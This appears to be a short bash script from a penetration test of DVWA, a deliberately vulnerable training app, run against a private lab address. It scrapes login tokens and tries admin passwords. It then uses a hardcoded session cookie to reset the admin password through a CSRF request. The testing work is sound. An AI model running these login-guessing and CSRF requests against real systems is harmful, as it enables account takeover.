B='http://10.31.0.87:3000'
mkdir -p evidence/logic

# 302 ambiguous; check redirect target
check_login() {
  P=$1
  rm -f /tmp/tj
  curl -s -c /tmp/tj -b /tmp/tj "$B/login.php" > /tmp/tl
  T=$(grep -oE "user_token' value='[0-9a-f]{32}" /tmp/tl | grep -oE '[0-9a-f]{32}')
  R=$(curl -s -b /tmp/tj -d "username=admin&password=$P&Login=Login&user_token=$T" "$B/login.php" -o /tmp/hdr -w '%{http_code}')
  LOC=$(grep -i '^Location' /tmp/hdr 2>/dev/null || true)
  echo "admin:$P => $R  $(echo \"$LOC\" | head -1)"
}
check_login password
check_login WRONGXYZ
check_login r5

# check_password_not_reset — re-set with CSRF & confirm
CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
curl -s -b "$CK; security=low" "$B/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" | grep -c 'Password Changed'
check_login password
